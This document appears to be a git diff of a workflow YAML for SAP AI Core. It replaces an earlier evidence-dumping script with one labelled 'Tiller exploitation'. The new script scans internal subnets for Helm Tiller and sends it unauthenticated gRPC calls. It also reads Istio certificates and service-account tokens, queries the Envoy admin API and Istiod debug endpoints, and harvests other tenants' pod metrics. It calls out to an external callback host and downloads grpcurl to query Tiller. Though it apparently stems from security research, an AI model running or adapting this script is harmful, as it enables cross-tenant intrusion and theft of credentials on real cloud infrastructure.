@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "25.0.0"
+    ai.sap.com/version: "26.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,29 +24,198 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V25 FULL EVIDENCE DUMP ==="
-        echo "=== SECTION:KSM-CUSTOM-FULL ==="
-        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1
-        echo "=== END:KSM-CUSTOM-FULL ==="
-        echo "=== SECTION:ENVOY-CONFIG-DUMP ==="
-        curl -s "http://localhost:15000/config_dump" 2>&1 | wc -c
-        echo "=== END:ENVOY-CONFIG-DUMP ==="
-        echo "=== SECTION:ENVOY-SDS ==="
-        curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | wc -c
-        echo "=== END:ENVOY-SDS ==="
-        echo "=== SECTION:ENVOY-CERTS ==="
-        curl -s "http://localhost:15000/certs" 2>&1
-        echo "=== END:ENVOY-CERTS ==="
-        echo "=== SECTION:ENVOY-CLUSTERS ==="
-        curl -s "http://localhost:15000/clusters" 2>&1 | head -c 50000
-        echo "=== END:ENVOY-CLUSTERS ==="
-        echo "=== SECTION:KSM-PODS-CROSS-TENANT ==="
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "kube_pod_info|kube_pod_container_info" | grep -v "rg-3ba0e0a4" | head -200
-        echo "=== END:KSM-PODS-CROSS-TENANT ==="
-        echo "=== SECTION:KSM-MULTI-CRONJOBS ==="
-        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob"
-        echo "=== END:KSM-MULTI-CRONJOBS ==="
-        echo "=== SECTION:ENV ==="
-        env | sort
-        echo "=== END:ENV ==="
-        echo "=== V25 DONE ==="
+        echo "=== TILLER EXPLOITATION - V26 ==="
+        echo "=== TIMESTAMP: $(date -u) ==="
+
+        # -------------------------------------------------------
+        # PHASE 1: Find Tiller IP (port 44134)
+        # Previous scans found 44134 open on 100.104.0.x and 100.104.1.x
+        # -------------------------------------------------------
+        echo "=== PHASE1: TILLER IP SCAN ==="
+        TILLER_IPS=""
+        for subnet in "100.104.0" "100.104.1" "100.104.2" "100.104.3"; do
+          echo "[*] Scanning ${subnet}.0/24 for port 44134..."
+          result=$(nmap -Pn -p44134 --open -T4 --min-rate 500 ${subnet}.0/24 2>/dev/null | grep -B2 "44134/tcp open" | grep "Nmap scan report" | awk '{print $5}')
+          if [ -n "$result" ]; then
+            echo "[+] FOUND TILLER: $result"
+            TILLER_IPS="$TILLER_IPS $result"
+          fi
+        done
+
+        # Also check pod subnet
+        for subnet in "100.64.80" "100.64.81"; do
+          result=$(nmap -Pn -p44134 --open -T4 --min-rate 500 ${subnet}.0/24 2>/dev/null | grep -B2 "44134/tcp open" | grep "Nmap scan report" | awk '{print $5}')
+          if [ -n "$result" ]; then
+            echo "[+] FOUND TILLER (pod subnet): $result"
+            TILLER_IPS="$TILLER_IPS $result"
+          fi
+        done
+
+        echo "[*] All Tiller IPs found: $TILLER_IPS"
+
+        # -------------------------------------------------------
+        # PHASE 2: Probe Tiller with multiple methods
+        # -------------------------------------------------------
+        echo "=== PHASE2: TILLER PROBES ==="
+        for ip in $TILLER_IPS; do
+          echo "[*] Testing $ip:44134"
+
+          # Method 1: Raw TCP probe
+          echo "[*] Method 1: Raw TCP"
+          echo "" | nc -w3 $ip 44134 2>&1 | xxd | head -5
+
+          # Method 2: HTTP/2 prior knowledge (gRPC uses HTTP/2)
+          echo "[*] Method 2: HTTP/2 gRPC"
+          curl -s --http2-prior-knowledge -X POST \
+            "http://${ip}:44134/hapi.services.tiller.ReleaseService/ListReleases" \
+            -H "Content-Type: application/grpc" \
+            -H "TE: trailers" \
+            -d '' -o /tmp/tiller_resp_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
+          xxd /tmp/tiller_resp_${ip}.bin 2>/dev/null | head -10
+
+          # Method 3: HTTP/2 with gRPC reflection
+          echo "[*] Method 3: gRPC reflection"
+          curl -s --http2-prior-knowledge -X POST \
+            "http://${ip}:44134/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo" \
+            -H "Content-Type: application/grpc" \
+            -H "TE: trailers" \
+            -d '' -o /tmp/tiller_reflect_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
+          xxd /tmp/tiller_reflect_${ip}.bin 2>/dev/null | head -10
+
+          # Method 4: Check if Envoy is proxying (look for envoy headers in response)
+          echo "[*] Method 4: HTTP probe for Envoy proxy behavior"
+          curl -sv "http://${ip}:44134/" 2>&1 | head -20
+
+          # Method 5: Try plaintext gRPC GetVersion (simpler than ListReleases)
+          # Construct minimal gRPC frame: 0x00 (no compress) + 4-byte length + protobuf
+          # GetVersion request is empty protobuf = just the gRPC frame header
+          echo "[*] Method 5: Raw gRPC GetVersion"
+          printf '\x00\x00\x00\x00\x00' | curl -s --http2-prior-knowledge -X POST \
+            "http://${ip}:44134/hapi.services.tiller.ReleaseService/GetVersion" \
+            -H "Content-Type: application/grpc" \
+            -H "TE: trailers" \
+            --data-binary @- -o /tmp/tiller_ver_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
+          xxd /tmp/tiller_ver_${ip}.bin 2>/dev/null | head -10
+
+        done
+
+        # -------------------------------------------------------
+        # PHASE 3: Check Istio cert material for mTLS bypass
+        # -------------------------------------------------------
+        echo "=== PHASE3: ISTIO CERT MATERIAL ==="
+        echo "[*] Checking standard Istio cert paths..."
+        for path in /var/run/secrets/istio /etc/certs /var/run/secrets/tokens /etc/istio/proxy; do
+          if [ -d "$path" ]; then
+            echo "[+] FOUND: $path"
+            ls -la "$path" 2>&1
+            for f in "$path"/*; do
+              echo "--- $f ---"
+              head -5 "$f" 2>&1
+            done
+          fi
+        done
+
+        # Check if there's an istio-proxy token
+        echo "[*] Service account tokens..."
+        ls -la /var/run/secrets/ 2>&1
+        find /var/run/secrets/ -type f 2>&1
+
+        # -------------------------------------------------------
+        # PHASE 4: Envoy sidecar proxy manipulation
+        # Try to use Envoy admin API to route to Tiller
+        # -------------------------------------------------------
+        echo "=== PHASE4: ENVOY PROXY MANIPULATION ==="
+
+        # Check Envoy passthrough cluster (handles unknown destinations)
+        echo "[*] Envoy PassthroughCluster config:"
+        curl -s "http://localhost:15000/clusters" 2>&1 | grep -A5 "PassthroughCluster"
+
+        # Check if outbound traffic to 44134 routes through Envoy
+        echo "[*] Envoy listeners for port 44134:"
+        curl -s "http://localhost:15000/listeners" 2>&1 | grep "44134"
+
+        # Check Envoy stats for 44134 connections
+        echo "[*] Envoy stats for 44134:"
+        curl -s "http://localhost:15000/stats" 2>&1 | grep "44134"
+
+        # -------------------------------------------------------
+        # PHASE 5: Try Istiod debug endpoints
+        # -------------------------------------------------------
+        echo "=== PHASE5: ISTIOD DEBUG ==="
+        # Get Istiod IPs from previous KSM/Envoy data
+        ISTIOD_IP=$(curl -s "http://localhost:15000/clusters" 2>&1 | grep "istiod" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+        echo "[*] Istiod IP: $ISTIOD_IP"
+        if [ -n "$ISTIOD_IP" ]; then
+          for endpoint in "/debug/configz" "/debug/endpointz" "/debug/authorizationz" "/debug/registryz"; do
+            echo "[*] Istiod ${endpoint}:"
+            curl -s "http://${ISTIOD_IP}:15014${endpoint}" 2>&1 | head -c 2000
+            echo ""
+          done
+        fi
+
+        # -------------------------------------------------------
+        # PHASE 6: Internet egress check (can we download tools?)
+        # -------------------------------------------------------
+        echo "=== PHASE6: EGRESS CHECK ==="
+        curl -s --connect-timeout 3 "https://github.com" -o /dev/null -w "github.com: %{http_code}\n" 2>&1
+        curl -s --connect-timeout 3 "https://www.masonhck.tech/cb.php?src=sap-aicore-v26-tiller" -o /dev/null -w "callback: %{http_code}\n" 2>&1
+
+        # If egress works, try downloading grpcurl
+        if curl -s --connect-timeout 3 "https://github.com" -o /dev/null 2>/dev/null; then
+          echo "[+] Internet access available! Downloading grpcurl..."
+          curl -sL "https://github.com/fullstorydev/grpcurl/releases/download/v1.9.3/grpcurl_1.9.3_linux_amd64.tar.gz" | tar xz -C /tmp/
+          chmod +x /tmp/grpcurl 2>/dev/null
+
+          if [ -f /tmp/grpcurl ]; then
+            echo "[+] grpcurl downloaded"
+            for ip in $TILLER_IPS; do
+              echo "[*] grpcurl plaintext ListReleases on $ip:44134"
+              /tmp/grpcurl -plaintext "${ip}:44134" hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -100
+              echo "[*] grpcurl plaintext GetVersion on $ip:44134"
+              /tmp/grpcurl -plaintext "${ip}:44134" hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -50
+              echo "[*] grpcurl list services on $ip:44134"
+              /tmp/grpcurl -plaintext "${ip}:44134" list 2>&1 | head -50
+            done
+          fi
+        else
+          echo "[-] No internet egress - cannot download grpcurl"
+          echo "[*] Attempting Python gRPC instead..."
+
+          # Python approach - craft raw gRPC frames
+          python3 -c "
+import socket, struct, sys
+
+# gRPC frame: 1 byte compressed flag + 4 bytes message length + protobuf payload
+def make_grpc_frame(data=b''):
+    return struct.pack('>?I', False, len(data)) + data
+
+# HTTP/2 connection preface
+H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+
+# Try each Tiller IP
+for ip in '$TILLER_IPS'.split():
+    if not ip.strip(): continue
+    print(f'[*] Python gRPC probe: {ip}:44134')
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((ip, 44134))
+        s.send(H2_PREFACE)
+        resp = s.recv(4096)
+        print(f'[+] Response ({len(resp)} bytes): {resp[:100]}')
+        s.close()
+    except Exception as e:
+        print(f'[-] Error: {e}')
+" 2>&1
+        fi
+
+        # -------------------------------------------------------
+        # PHASE 7: Fresh KSM dump for evidence continuity
+        # -------------------------------------------------------
+        echo "=== PHASE7: KSM EVIDENCE ==="
+        echo "[*] KSM-pods cross-tenant sample:"
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_pod_info" | grep -v "rg-3ba0e0a4" | head -20
+        echo "[*] KSM-pods total bytes:"
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | wc -c
+
+        echo "=== V26 DONE ==="
